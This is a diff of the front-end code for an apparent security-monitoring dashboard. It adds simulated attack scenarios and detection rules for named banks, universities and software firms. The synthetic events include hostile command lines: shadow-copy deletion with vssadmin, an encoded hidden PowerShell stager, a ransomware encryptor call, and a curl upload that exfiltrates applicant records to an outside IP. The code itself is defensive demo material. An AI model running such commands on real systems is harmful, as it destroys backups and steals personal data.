@@ -195,17 +195,22 @@
           } else if (ev.process === "vssadmin.exe" || ev.action === "shadow_delete" || (ev.cmdline && ev.cmdline.indexOf("vssadmin") !== -1)) {
             rId = "rb-007"; rTitle = "Ransomware volume shadow deletion and bulk encryption"; rSev = "critical"; actKind = "isolate_host"; actTarget = ev.host || "filesrv-01";
             sumText = "Ransomware shadow deletion and mass file encryption activity detected.";
-          } else if (ev.message && ev.message.indexOf("anomalous country") !== -1) {
-            rId = "rb-008"; rTitle = "Suspicious login from anomalous country or foreign IP"; rSev = "high"; actKind = "disable_user"; actTarget = ev.user || "svc-backup";
-            sumText = "Service credential authentication originating from anomalous foreign IP.";
+          } else if (ev.action === "data_exfiltration" || (ev.cmdline && ev.cmdline.indexOf("upload") !== -1)) {
+            rId = "rb-009"; rTitle = "Suspicious data exfiltration to external IP"; rSev = "high"; actKind = "isolate_host"; actTarget = ev.host || "server-01";
+            sumText = "High-volume data exfiltration detected targeting external staging address.";
+          } else if (ev.action === "fund_transfer" || (ev.message && ev.message.indexOf("transfer batch") !== -1)) {
+            rId = "rb-010"; rTitle = "Unusual high-value fund transfer anomaly"; rSev = "critical"; actKind = "disable_user"; actTarget = ev.user || "system.raast";
+            sumText = "Off-hours high-value settlement anomaly detected on instant payment gateway.";
           }
 
+          var clientName = ev.client || "Meezan Bank";
           var newAlert = {
             id: newId,
             title: rTitle,
             severity: rSev,
             status: "triaged",
             rule_id: rId,
+            client: clientName,
             ts: Math.floor(Date.now() / 1000),
             host: ev.host || "fin-lt-042",
             user: ev.user || "m.silva",
@@ -222,7 +227,16 @@
             events: items
           };
           simData.alerts.unshift(newAlert);
+          simData.cases.unshift({
+            id: 100 + newId,
+            entity: (ev.host || ev.user || "endpoint") + " (" + clientName + ")",
+            severity: rSev,
+            status: "open",
+            client: clientName,
+            ts: Math.floor(Date.now() / 1000)
+          });
           simData.stats.open_alerts = simData.alerts.length;
+          simData.stats.open_cases = simData.cases.length;
           simData.stats.events += items.length;
           return resolve({ accepted: items.length });
         }
@@ -237,6 +251,7 @@
             actor: "analyst:muhammad.nabil",
             kind: "action_approved",
             alert_id: id,
+            client: alert ? alert.client : "Meezan Bank",
             detail: "Automated response approved: " + (alert && alert.proposed_action ? alert.proposed_action.kind : "action"),
             hash: h,
             prev_hash: "00000000000000000000000000000000"
@@ -259,7 +274,7 @@
         }
         if (cleanPath === "/api/cases") return resolve(simData.cases);
         if (cleanPath === "/api/audit") return resolve(simData.audit);
-        reject(new Error("Endpoint not found: " + path));
+        reject(new Error("API route not found (404): " + cleanPath + " [" + (method || "GET") + "]. Switch to live backend or check route."));
       }, 50);
     });
   }
@@ -293,9 +308,17 @@
 
         if (!r.ok) {
           if (r.status === 404) {
-            throw new Error("API route not found (404). Toggle server mode to 'In-Browser Sim' to run standalone without a terminal.");
+            var msg = "API route not found (404): " + requestPath + " [" + (method || "GET") + "]. ";
+            if (j && j.suggestion) {
+              msg += j.suggestion;
+            } else if (j && (j.detail || j.error)) {
+              msg += (j.detail || j.error);
+            } else {
+              msg += "Check backend route registration in service.py / api.py or toggle server mode to 'In-Browser Sim'.";
+            }
+            throw new Error(msg);
           }
-          throw new Error((j && j.error) ? j.error : ("Server error (" + r.status + ")"));
+          throw new Error((j && (j.detail || j.error)) ? (j.detail || j.error) : ("Server error (" + r.status + ")"));
         }
         return j !== null ? j : txt;
       });
@@ -496,6 +519,9 @@
 
       var meta = el("div", "alert-item-meta");
       var entity = a.host || a.user || a.src_ip || "system";
+      if (a.client) {
+        meta.appendChild(el("span", "client-badge", a.client));
+      }
       meta.appendChild(el("span", "entity-badge", entity));
       meta.appendChild(el("span", "time-badge", when(a.ts)));
       item.appendChild(meta);
@@ -541,6 +567,7 @@
       hero.appendChild(el("h2", "inspector-title", a.title));
 
       var chips = el("div", "inspector-chips");
+      if (a.client) chips.appendChild(el("span", "chip client-badge", a.client));
       chips.appendChild(el("span", "chip", "Status: " + a.status));
       chips.appendChild(el("span", "chip", when(a.ts)));
       if (a.case_id) chips.appendChild(el("span", "chip chip-case", "Case #" + a.case_id));
@@ -754,7 +781,7 @@
       if (!evs || !evs.length) {
         var tr = el("tr");
         var td = el("td", null, "No telemetry records ingested yet.");
-        td.colSpan = 9;
+        td.colSpan = 10;
         td.style.textAlign = "center";
         td.style.padding = "24px";
         td.style.color = "var(--text-tertiary)";
@@ -766,6 +793,7 @@
         var tr = el("tr");
         tr.appendChild(el("td", null, "#" + e.id));
         tr.appendChild(el("td", null, when(e.ts)));
+        tr.appendChild(el("td", null, e.client || "–"));
         tr.appendChild(el("td", null, e.source || "api"));
         tr.appendChild(el("td", null, e.host || "–"));
         tr.appendChild(el("td", null, e.user || "–"));
@@ -781,150 +809,799 @@
     }).catch(function () {});
   }
 
-  /* ── Attack Simulation Lab (Demo Tab) ─────────────────── */
-  var ATTACK_SCENARIOS = {
-    phishing: {
-      name: "Phishing Credential Harvester",
-      sentence: "Attacker sent a spear-phishing email containing a deceptive link to login-verify-account.com, luring user j.doe to click and submit credentials from external proxy IP 203.0.113.50.",
-      rule_id: "rb-006",
-      rule_title: "Phishing link accessed from email gateway",
-      severity: "high",
-      events: function () {
-        var now = Math.floor(Date.now() / 1000);
-        return [
-          {
-            ts: now - 5,
-            host: "corp-mail-gw",
-            user: "j.doe",
-            process: "outlook.exe",
-            action: "email_link_click",
-            src_ip: "203.0.113.50",
-            message: "User clicked inbound link to http://login-verify-account.com/login"
+  /* ── Attack Simulation Lab (Demo Tab & Client Organizations) ──── */
+  var CLIENT_ORGANIZATIONS = {
+    meezan: {
+      id: "meezan",
+      name: "Meezan Bank",
+      category: "Islamic Commercial Bank",
+      overview: "Premier Islamic commercial bank in Pakistan, established in 2002. Operates a nationwide branch network providing Shariah-compliant retail, commercial, and investment banking services.",
+      platforms: "Mobile Banking App, Digital Account Opening App, Internet Banking Portal, WhatsApp Banking, SMS Alert Gateway, ATMs, Raast Instant Payment Settlement.",
+      risks: "Spear-phishing & fake SMS/WhatsApp messages impersonating the bank, customer account takeover (ATO), card/payment fraud, insider misuse, web banking brute force.",
+      scenarios: [
+        {
+          id: "meezan_phish",
+          title: "Fake Bank Login Phishing",
+          severity: "high",
+          rule_id: "rb-006",
+          sentence: "Attacker sent spoofed SMS/WhatsApp messages luring customer customer.tariq to fraudulent portal meezan-fake-login.com, capturing credentials from proxy IP 203.0.113.88.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            return [
+              {
+                ts: now - 5,
+                host: "meezan-msg-gw",
+                user: "customer.tariq",
+                action: "email_link_click",
+                src_ip: "203.0.113.88",
+                message: "Customer followed link to http://meezan-fake-login.com/ibanking/verify",
+                client: "Meezan Bank"
+              },
+              {
+                ts: now,
+                host: "meezan-ibanking-srv",
+                user: "customer.tariq",
+                process: "sso_auth",
+                action: "login",
+                outcome: "success",
+                src_ip: "203.0.113.88",
+                message: "Web login following external phishing redirection",
+                client: "Meezan Bank"
+              }
+            ];
           },
-          {
-            ts: now,
-            host: "sso-portal",
-            user: "j.doe",
-            process: "sso_auth",
-            action: "login",
-            outcome: "success",
-            src_ip: "203.0.113.50",
-            message: "Credential entered following external link redirection"
-          }
-        ];
-      },
-      what_happened: "The email gateway detected a user opening a link referencing blacklisted domain login-verify-account.com. Immediately following the link click, successful authentication was recorded from external IP 203.0.113.50. Riskbyte's detection rule rb-006 triggered at High severity, threat intelligence verified the domain on the blacklist, and the AI triage agent confirmed credential compromise. An immediate automated password reset action was proposed and approved to prevent further unauthorized access."
-    },
-    ssh_brute: {
-      name: "SSH Brute Force Attack",
-      sentence: "External automated scanner launched a high-frequency dictionary attack against SSH service on web-01 from blacklisted scanner IP 1.2.3.4.",
-      rule_id: "rb-001",
-      rule_title: "SSH brute force from a single source",
-      severity: "medium",
-      events: function () {
-        var now = Math.floor(Date.now() / 1000);
-        var evs = [];
-        for (var i = 0; i < 6; i++) {
-          evs.push({
-            ts: now - 30 + i * 4,
-            host: "web-01",
-            process: "sshd",
-            action: "login",
-            outcome: "failure",
-            user: "root",
-            src_ip: "1.2.3.4",
-            message: "Failed password for root"
-          });
+          steps: {
+            s1: {
+              means: "An attacker distributed deceptive messages impersonating official bank alerts to harvest login credentials.",
+              impact: "Stolen customer credentials lead directly to account takeover and fraudulent fund withdrawals."
+            },
+            s2: {
+              means: "The telemetry pipeline ingested and normalized proxy and authentication logs from the gateway.",
+              impact: "Immediate log ingestion catches compromised accounts before funds can be transferred."
+            },
+            s3: {
+              means: "Detection rule rb-006 triggered upon matching a web request directed at a credential harvesting site.",
+              impact: "Protects online banking users by intercepting sessions connected to known fraudulent domains."
+            },
+            s4: {
+              means: "Riskbyte verified the destination URL against active threat intelligence indicator feeds.",
+              impact: "Confirms that meezan-fake-login.com is an active hostile domain spoofing the bank's brand."
+            },
+            s5: {
+              means: "The autonomous AI engine correlated the link click with immediate authentication, concluding malicious intent.",
+              impact: "Eliminates false positives so security analysts focus on urgent customer protection."
+            },
+            s6: {
+              means: "The containment engine proposed forcing an immediate customer password reset and session invalidation.",
+              impact: "Instantly neutralizes the attacker's stolen credentials before funds can be moved."
+            },
+            s7: {
+              means: "A cryptographically sealed SHA-256 ledger record documented the containment action and analyst approval.",
+              impact: "Satisfies State Bank of Pakistan (SBP) cybersecurity audit and incident reporting requirements."
+            }
+          },
+          what_happened: "An attacker spoofed Meezan Bank SMS notifications, luring user customer.tariq to a fraudulent portal (meezan-fake-login.com). Riskbyte detected the known phishing domain, flagged the session under rule rb-006, and the AI agent recommended an immediate credential revocation to safeguard the customer's account balance."
+        },
+        {
+          id: "meezan_anomalous_login",
+          title: "Suspicious Overseas Staff Login",
+          severity: "high",
+          rule_id: "rb-008",
+          sentence: "Compromised staff credentials for staff.farooq were used to access the internal core banking VPN from foreign IP 198.51.100.99.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            return [
+              {
+                ts: now,
+                host: "meezan-vpn-gw",
+                user: "staff.farooq",
+                process: "sshd",
+                action: "login",
+                outcome: "success",
+                src_ip: "198.51.100.99",
+                message: "Staff portal login accepted from anomalous country via foreign endpoint 198.51.100.99",
+                client: "Meezan Bank"
+              }
+            ];
+          },
+          steps: {
+            s1: {
+              means: "An unauthorized entity used valid staff credentials to authenticate from an anomalous foreign location.",
+              impact: "Unauthorized overseas access to internal bank systems can bypass perimeter controls and expose core financial data."
+            },
+            s2: {
+              means: "The perimeter VPN gateway emitted successful authentication telemetry to Riskbyte's ingest service.",
+              impact: "Real-time telemetry ensures foreign connection attempts are spotted the moment access is granted."
+            },
+            s3: {
+              means: "Rule rb-008 identified abnormal geographic provenance deviating from the employee's regular baseline.",
+              impact: "Safeguards core banking applications from remote administrative account hijack."
+            },
+            s4: {
+              means: "Riskbyte cross-referenced the foreign IP 198.51.100.99 with global adversarial hosting feeds.",
+              impact: "Confirms the connection originated from an untrusted proxy host rather than legitimate staff travel."
+            },
+            s5: {
+              means: "The AI triage agent verified the absence of travel approval and declared malicious credential abuse.",
+              impact: "Prevents attackers from moving laterally into sensitive interbank payment systems."
+            },
+            s6: {
+              means: "The mitigation engine proposed disabling user staff.farooq and revoking all active sessions.",
+              impact: "Quarantines the compromised user account before internal bank databases can be manipulated."
+            },
+            s7: {
+              means: "An immutable SHA-256 block registered the containment action with previous block hash chaining.",
+              impact: "Guarantees verifiable forensics required during financial regulatory investigations."
+            }
+          },
+          what_happened: "Stolen credentials for staff member staff.farooq were authenticated through the core banking gateway from untrusted foreign IP 198.51.100.99. Riskbyte immediately correlated the geo-anomaly, and the AI triage engine generated an alert to quarantine the user account pending security validation."
+        },
+        {
+          id: "meezan_brute",
+          title: "Internet Banking Brute Force",
+          severity: "medium",
+          rule_id: "rb-001",
+          sentence: "Automated botnet launched repeated credential guessing attempts against the Meezan internet banking portal from IP 1.2.3.4.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            var evs = [];
+            for (var i = 0; i < 6; i++) {
+              evs.push({
+                ts: now - 30 + i * 4,
+                host: "meezan-web-auth",
+                process: "sshd",
+                action: "login",
+                outcome: "failure",
+                user: "ibanking_admin",
+                src_ip: "1.2.3.4",
+                message: "Failed password for ibanking_admin",
+                client: "Meezan Bank"
+              });
+            }
+            return evs;
+          },
+          steps: {
+            s1: {
+              means: "An automated dictionary attack bombarded the banking portal with rapid password guesses.",
+              impact: "Continuous credential stuffing risks compromising weakly secured accounts and causes server latency."
+            },
+            s2: {
+              means: "Riskbyte ingested multiple failed authentication records from the internet banking authentication cluster.",
+              impact: "Centralized log aggregation correlates failed attempts distributed across web frontends."
+            },
+            s3: {
+              means: "Threshold detection rule rb-001 triggered after detecting 5 failed logins within 5 minutes.",
+              impact: "Detects brute-force sweeps early before customer or admin accounts are cracked."
+            },
+            s4: {
+              means: "Threat intelligence feeds matched IP 1.2.3.4 to known automated malicious scanners.",
+              impact: "Validates that the traffic is hostile automation rather than a customer mistyping passwords."
+            },
+            s5: {
+              means: "The AI engine evaluated attempt frequency and confirmed an automated brute force pattern with 97% confidence.",
+              impact: "Automates initial alert filtering so security analysts are not overwhelmed by noise."
+            },
+            s6: {
+              means: "The containment policy proposed automatically blocking scanner IP 1.2.3.4 at the border firewall.",
+              impact: "Drops malicious traffic instantly at the network edge, preserving portal responsiveness."
+            },
+            s7: {
+              means: "The firewall block rule and analyst approval were recorded in the SHA-256 tamper-evident log.",
+              impact: "Provides an auditable track record of defensive network configuration changes."
+            }
+          },
+          what_happened: "An external scanner at 1.2.3.4 performed rapid failed logins against the web authentication service. Rule rb-001 detected the 5+ threshold breach, and Riskbyte proposed an immediate perimeter IP block."
+        },
+        {
+          id: "meezan_transfer",
+          title: "Raast Payment Anomaly",
+          severity: "critical",
+          rule_id: "rb-010",
+          sentence: "Anomalous high-value batch fund transfer ($500,000) was initiated via the Raast payment gateway outside normal operating hours.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            return [
+              {
+                ts: now,
+                host: "meezan-raast-gw",
+                user: "system.raast",
+                process: "raast_transfer.exe",
+                action: "fund_transfer",
+                outcome: "success",
+                src_ip: "198.51.100.44",
+                message: "Off-hours transfer batch $500,000 to external recipient via Raast switch",
+                client: "Meezan Bank"
+              }
+            ];
+          },
+          steps: {
+            s1: {
+              means: "An off-hours bulk financial transaction exceeding standard thresholds was submitted to the instant payment switch.",
+              impact: "Raast settlements are irrevocable in real time, making instant detection vital to preventing catastrophic funds loss."
+            },
+            s2: {
+              means: "Transaction settlement telemetry from the Raast payment gateway was received and parsed.",
+              impact: "Ingestion enables continuous automated monitoring over instant payment transactions."
+            },
+            s3: {
+              means: "Detection rule rb-010 identified the transfer anomaly based on off-hours timing and high value.",
+              impact: "Protects the bank and customers against unauthorized batch fund siphoning."
+            },
+            s4: {
+              means: "Destination transaction node was matched against external high-risk payment routing indicators.",
+              impact: "Verifies that destination recipient endpoints are linked to suspicious cash-out activity."
+            },
+            s5: {
+              means: "Autonomous AI flagged anomalous transaction velocity and deviation from historical baselines.",
+              impact: "Equips analysts with immediate contextual risk justification to freeze suspicious payments."
+            },
+            s6: {
+              means: "The containment engine proposed suspending the payment service account and holding the transaction batch.",
+              impact: "Intercepts the funds in the gateway before interbank clearance completes."
+            },
+            s7: {
+              means: "The transaction hold and analyst sign-off were permanently logged in the SHA-256 blockchain ledger.",
+              impact: "Fulfills statutory regulatory and forensic requirements for financial clearing networks."
+            }
+          },
+          what_happened: "An abnormal fund transfer event was detected on the Raast payment gateway. Riskbyte triggered rule rb-010, the AI agent assigned a high-severity malicious verdict, and requested analyst sign-off to freeze downstream clearing."
         }
-        return evs;
-      },
-      what_happened: "External scanner 1.2.3.4 sent 6 failed SSH login attempts within 30 seconds targeting the root administrative account on web-01. The sliding-window threshold rule rb-001 fired upon reaching 5 failures within 5 minutes. Threat intelligence verified 1.2.3.4 as a known malicious scanner. The AI agent triaged the incident with 98% confidence as malicious and proposed blocking the IP address at network edge firewalls."
+      ]
     },
-    malware: {
-      name: "Malware (Encoded PowerShell)",
-      sentence: "Adversary executed a concealed, Base64-encoded PowerShell process attempting in-memory execution and payload download from C2 198.51.100.99.",
-      rule_id: "rb-002",
-      rule_title: "Encoded PowerShell command",
-      severity: "high",
-      events: function () {
-        var now = Math.floor(Date.now() / 1000);
-        return [
-          {
-            ts: now,
-            host: "fin-lt-042",
-            user: "m.silva",
-            process: "powershell.exe",
-            cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGo...",
-            src_ip: "10.0.4.15",
-            dst_ip: "198.51.100.99",
-            action: "process_start",
-            outcome: "success",
-            message: "PowerShell launched with encoded command connecting to 198.51.100.99"
-          }
-        ];
-      },
-      what_happened: "Process telemetry on workstation fin-lt-042 captured powershell.exe invoked with hidden and Base64 encoded command line parameters. The process established a network connection to known C2 indicator 198.51.100.99. Rule rb-002 flagged the execution, and the AI triage engine confirmed high likelihood of memory injection and stager download. An automated host isolation action was approved, severing endpoint network connectivity and preventing lateral propagation."
-    },
-    ransomware: {
-      name: "Ransomware-Style Activity",
-      sentence: "Ransomware payload initiated volume shadow copy deletion via vssadmin and commenced rapid mass file encryption across storage volumes.",
-      rule_id: "rb-007",
-      rule_title: "Ransomware volume shadow deletion and bulk encryption",
-      severity: "critical",
-      events: function () {
-        var now = Math.floor(Date.now() / 1000);
-        return [
-          {
-            ts: now - 2,
-            host: "filesrv-01",
-            user: "admin.backup",
-            process: "vssadmin.exe",
-            cmdline: "vssadmin delete shadows /all /quiet",
-            action: "shadow_delete",
-            outcome: "success",
-            message: "Volume shadow copies purged via vssadmin utility"
+    shu: {
+      id: "shu",
+      name: "Salim Habib University (SHU)",
+      category: "Higher Education Institution",
+      overview: "Private HEC-recognized higher education institution located in Korangi Creek, Karachi (formerly Barrett Hodgson University), offering degrees across Pharmacy, Computer Science, and Biosciences.",
+      platforms: "Online Admissions Portal (shu.edu.pk), Student Learning Management System (LMS), Campus Active Directory, Student Computer Laboratories, Faculty Research Workstations.",
+      risks: "Phishing targeting faculty and students, automated credential brute force against the online admissions portal, ransomware outbreaks across student lab PCs, exfiltration of sensitive applicant identity documents and personal records.",
+      scenarios: [
+        {
+          id: "shu_phish",
+          title: "Admissions & Faculty Phishing",
+          severity: "high",
+          rule_id: "rb-006",
+          sentence: "Adversary dispatched a spoofed email mimicking SHU Registrar, luring faculty member faculty.ahmed to blacklisted site shu-admissions-phish.com.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            return [
+              {
+                ts: now - 5,
+                host: "shu-mail-gw",
+                user: "faculty.ahmed",
+                action: "email_link_click",
+                src_ip: "203.0.113.88",
+                message: "User clicked link to http://shu-admissions-phish.com/faculty/portal",
+                client: "Salim Habib University"
+              },
+              {
+                ts: now,
+                host: "shu-lms-portal",
+                user: "faculty.ahmed",
+                process: "sso_auth",
+                action: "login",
+                outcome: "success",
+                src_ip: "203.0.113.88",
+                message: "LMS authentication completed following external phishing redirection",
+                client: "Salim Habib University"
+              }
+            ];
           },
-          {
-            ts: now,
-            host: "filesrv-01",
-            user: "admin.backup",
-            process: "encryptor.exe",
-            cmdline: "encryptor.exe --target D:\\Shares --key ransomware-c2.net",
-            action: "mass_file_rename",
-            outcome: "success",
-            message: "Mass file modification: 450 files renamed with .locked extension"
-          }
-        ];
-      },
-      what_happened: "Host filesrv-01 recorded an invocation of 'vssadmin delete shadows /all /quiet' to prevent recovery, immediately followed by bulk file extension modifications and network connections to ransomware-c2.net. Rule rb-007 triggered at Critical severity. The AI triage agent confirmed active cryptographic ransomware in progress and proposed immediate host network quarantine, preventing data loss across enterprise shared drives."
+          steps: {
+            s1: {
+              means: "An attacker distributed fraudulent emails mimicking university administration to steal faculty login credentials.",
+              impact: "Compromised faculty accounts risk unauthorized grading changes and exposure of proprietary research."
+            },
+            s2: {
+              means: "The campus email gateway recorded a link click and sent telemetry to Riskbyte's ingest service.",
+              impact: "Captures phishing exposure across thousands of student and faculty mailboxes."
+            },
+            s3: {
+              means: "Rule rb-006 triggered upon detecting user navigation to a known phishing domain.",
+              impact: "Stops credential theft before attackers can access internal academic databases."
+            },
+            s4: {
+              means: "Riskbyte matched the URL domain against threat intelligence feeds containing known university phishing campaigns.",
+              impact: "Validates that the link was created specifically to deceive university staff."
+            },
+            s5: {
+              means: "The AI triage agent verified domain intent and assigned a malicious verdict with 95% confidence.",
+              impact: "Automatically prioritizes attacks against staff accounts without overwhelming campus IT."
+            },
+            s6: {
+              means: "The system recommended forcing a password reset and invalidating existing faculty session tokens.",
+              impact: "Prevents the intruder from using harvested credentials to log into campus systems."
+            },
+            s7: {
+              means: "The containment approval was cryptographically linked to the SHA-256 audit ledger.",
+              impact: "Provides verifiable forensic documentation for university IT administration."
+            }
+          },
+          what_happened: "Faculty member faculty.ahmed opened a malicious phishing link mimicking the SHU portal. Riskbyte matched the domain against threat intelligence feeds, alerted the SOC, and proposed a password reset to protect academic databases."
+        },
+        {
+          id: "shu_brute",
+          title: "Admissions Portal Brute Force",
+          severity: "medium",
+          rule_id: "rb-001",
+          sentence: "External botnet launched automated dictionary attacks against the SHU online admissions administrative server from IP 1.2.3.4.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            var evs = [];
+            for (var i = 0; i < 6; i++) {
+              evs.push({
+                ts: now - 30 + i * 4,
+                host: "shu-admissions-srv",
+                process: "sshd",
+                action: "login",
+                outcome: "failure",
+                user: "admissions_admin",
+                src_ip: "1.2.3.4",
+                message: "Failed password for admissions_admin",
+                client: "Salim Habib University"
+              });
+            }
+            return evs;
+          },
+          steps: {
+            s1: {
+              means: "An automated botnet attempted dozens of password combinations against the admissions portal admin interface.",
+              impact: "Successful brute-force attacks expose confidential applicant documents and student records."
+            },
+            s2: {
+              means: "Admissions web server logs were ingested in real time via Riskbyte's event receiver.",
+              impact: "Maintains continuous visibility across public-facing student admission portals."
+            },
+            s3: {
+              means: "Rule rb-001 identified 5 consecutive failed logins originating from a single source within 5 minutes.",
+              impact: "Halts automated password guessing before administrative access is compromised."
+            },
+            s4: {
+              means: "Source IP 1.2.3.4 was correlated with public lists of malicious scanning nodes.",
+              impact: "Differentiates between authentic applicants having login trouble and malicious scanners."
+            },
+            s5: {
+              means: "AI triage classified the traffic as malicious dictionary scanning with high confidence.",
+              impact: "Frees university IT staff from manually triaging web server authentication errors."
+            },
+            s6: {
+              means: "The mitigation policy proposed blocking IP 1.2.3.4 at the campus perimeter firewall.",
+              impact: "Protects admissions portal availability during high-traffic student enrollment periods."
+            },
+            s7: {
+              means: "The containment action and approving analyst ID were immutably hashed in the audit log.",
+              impact: "Satisfies institutional accreditation compliance and audit requirements."
+            }
+          },
+          what_happened: "An external botnet tried cracking the admissions portal admin account. The multi-attempt threshold rule rb-001 fired, leading to an automated firewall drop proposal."
+        },
+        {
+          id: "shu_ransomware",
+          title: "Lab PC Ransomware & Shadow Deletion",
+          severity: "critical",
+          rule_id: "rb-007",
+          sentence: "Trojanized download on student lab computer lab-pc-18 purged volume shadow copies via vssadmin and initiated mass file encryption.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            return [
+              {
+                ts: now - 2,
+                host: "lab-pc-18",
+                user: "student_lab",
+                process: "vssadmin.exe",
+                cmdline: "vssadmin delete shadows /all /quiet",
+                action: "shadow_delete",
+                outcome: "success",
+                message: "Volume shadow copies purged via vssadmin",
+                client: "Salim Habib University"
+              },
+              {
+                ts: now,
+                host: "lab-pc-18",
+                user: "student_lab",
+                process: "encryptor.exe",
+                cmdline: "encryptor.exe --target C:\\Users --key ransomware-c2.net",
+                action: "mass_file_rename",
+                outcome: "success",
+                message: "Mass file modification: 320 files encrypted with .locked extension",
+                client: "Salim Habib University"
+              }
+            ];
+          },
+          steps: {
+            s1: {
+              means: "A ransomware binary executed on a student lab computer, deleting backup copies and encrypting local files.",
+              impact: "Ransomware in student labs can spread laterally across campus subnets to admin servers."
+            },
+            s2: {
+              means: "Endpoint telemetry captured process starts for vssadmin shadow deletion and mass file renaming.",
+              impact: "Early endpoint detection stops ransomware before it reaches networked departmental file shares."
+            },
+            s3: {
+              means: "Critical rule rb-007 fired upon matching command line arguments used to delete Windows backup shadow copies.",
+              impact: "Rapidly identifies irreversible destructive ransomware behaviors in progress."
+            },
+            s4: {
+              means: "Outbound command-and-control communication matched indicators for ransomware-c2.net.",
+              impact: "Confirms the presence of active extortion malware seeking encryption keys."
+            },
+            s5: {
+              means: "AI triage assigned a Critical malicious verdict with 98% confidence based on behavioral destructive patterns.",
+              impact: "Instantly escalates catastrophic threats requiring emergency IT intervention."
+            },
+            s6: {
+              means: "The containment engine proposed instantly isolating lab-pc-18 from the campus local area network.",
+              impact: "Quarantines the affected workstation, preventing ransomware from spreading to other lab PCs."
+            },
+            s7: {
+              means: "Workstation network isolation was logged in the SHA-256 tamper-evident ledger.",
+              impact: "Preserves critical incident timeline evidence for university leadership and recovery teams."
+            }
+          },
+          what_happened: "Ransomware execution on lab-pc-18 deleted backup shadow copies and began encrypting files. Riskbyte immediately generated a Critical alert and prompted for host network isolation."
+        },
+        {
+          id: "shu_data_export",
+          title: "Applicant Data Exfiltration",
+          severity: "high",
+          rule_id: "rb-009",
+          sentence: "Unauthorized command-line upload exfiltrated 2026 admissions applicant personal records archive to external IP 198.51.100.44.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            return [
+              {
+                ts: now,
+                host: "shu-admissions-srv",
+                user: "web_admin",
+                process: "curl.exe",
+                cmdline: "curl -X POST https://198.51.100.44/upload --data-binary @applicants_2026.zip",
+                action: "data_exfiltration",
+                outcome: "success",
+                src_ip: "10.0.1.50",
+                dst_ip: "198.51.100.44",
+                message: "Bulk export of applicant identity and admission records to 198.51.100.44",
+                client: "Salim Habib University"
+              }
+            ];
+          },
+          steps: {
+            s1: {
+              means: "An adversary used command-line transfer tools to exfiltrate compressed admissions files to an external server.",
+              impact: "Applicant archives contain national identity numbers (CNIC) and confidential certificates."
+            },
+            s2: {
+              means: "Admissions server process and network telemetry recorded outbound file transmission to an external host.",
+              impact: "Continuous network logging captures unauthorized large-scale data transfers."
+            },
+            s3: {
+              means: "Rule rb-009 triggered on detecting data exfiltration behavior targeting untrusted external IP addresses.",
+              impact: "Flags unauthorized data leaks before intellectual property or applicant records are lost."
+            },
+            s4: {
+              means: "Destination IP 198.51.100.44 matched active threat feeds tracking data staging repositories.",
+              impact: "Verifies the destination is an unauthorized adversary collection server."
+            },
+            s5: {
+              means: "AI triage verified anomalous process execution and declared high-confidence data exfiltration.",
+              impact: "Accurately identifies data breaches without disrupting regular university web traffic."
+            },
+            s6: {
+              means: "The mitigation policy proposed isolating the admissions server host and severing outbound connections.",
+              impact: "Cuts the exfiltration pipeline immediately to prevent further student data theft."
+            },
+            s7: {
+              means: "Host isolation and analyst confirmation were permanently written to the SHA-256 audit chain.",
+              impact: "Ensures legal and regulatory compliance under university data privacy governance."
+            }
+          },
+          what_happened: "A data exfiltration utility uploaded admissions records to external IP 198.51.100.44. Rule rb-009 detected the egress anomaly, and Riskbyte recommended immediately severing the egress route."
+        }
+      ]
     },
-    anomalous_login: {
-      name: "Suspicious Geo Login",
-      sentence: "Compromised service credentials used to establish an anomalous remote access session from an unauthorized foreign IP (198.51.100.99).",
-      rule_id: "rb-008",
-      rule_title: "Suspicious login from anomalous country or foreign IP",
-      severity: "high",
-      events: function () {
-        var now = Math.floor(Date.now() / 1000);
-        return [
-          {
-            ts: now,
-            host: "vpn-gw-01",
-            user: "svc-backup",
-            process: "sshd",
-            action: "login",
-            outcome: "success",
-            src_ip: "198.51.100.99",
-            message: "Login accepted from anomalous country via foreign endpoint 198.51.100.99"
-          }
-        ];
-      },
-      what_happened: "Authentication telemetry on vpn-gw-01 recorded a successful login on service account svc-backup originating from foreign IP 198.51.100.99, an indicator listed in active threat feeds. Rule rb-008 identified anomalous geographic deviation. The AI triage agent confirmed high probability of credential theft and proposed disabling the user account immediately to protect backup repositories."
+    contour: {
+      id: "contour",
+      name: "Contour Software",
+      category: "Enterprise Software Resource Center",
+      overview: "Subsidiary of Constellation Software Inc. (Canada) founded in Karachi in 2010, operating technology resource centers across Karachi, Lahore, and Islamabad serving enterprise software businesses worldwide.",
+      platforms: "Developer Workstations (macOS/Windows/Linux), CI/CD GitLab & Jenkins Build Servers, Enterprise Source Code Repositories, Corporate VPN Gateways, Global Payroll Engines.",
+      risks: "Stolen developer credentials, proprietary source code theft, malware on developer laptops, software supply-chain attacks, corporate VPN abuse.",
+      scenarios: [
+        {
+          id: "contour_malware",
+          title: "Encoded PowerShell on Dev Laptop",
+          severity: "high",
+          rule_id: "rb-002",
+          sentence: "Adversary ran obfuscated Base64 PowerShell commands on developer laptop dev-ws-042, connecting to C2 198.51.100.99.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            return [
+              {
+                ts: now,
+                host: "dev-ws-042",
+                user: "dev.tahir",
+                process: "powershell.exe",
+                cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGo...",
+                action: "process_start",
+                outcome: "success",
+                src_ip: "10.10.4.15",
+                dst_ip: "198.51.100.99",
+                message: "PowerShell launched with encoded command connecting to 198.51.100.99",
+                client: "Contour Software"
+              }
+            ];
+          },
+          steps: {
+            s1: {
+              means: "An attacker executed hidden Base64 PowerShell commands designed to evade local antivirus scanners.",
+              impact: "Developer laptops hold repository credentials, API keys, and access to build pipelines."
+            },
+            s2: {
+              means: "Endpoint telemetry captured process start events containing obfuscated command-line arguments.",
+              impact: "Ensures remote development machines report suspicious process behavior immediately."
+            },
+            s3: {
+              means: "Rule rb-002 fired on identifying Base64-encoded execution flags commonly used in cyberattacks.",
+              impact: "Detects in-memory evasion tactics before attackers establish permanent backdoors."
+            },
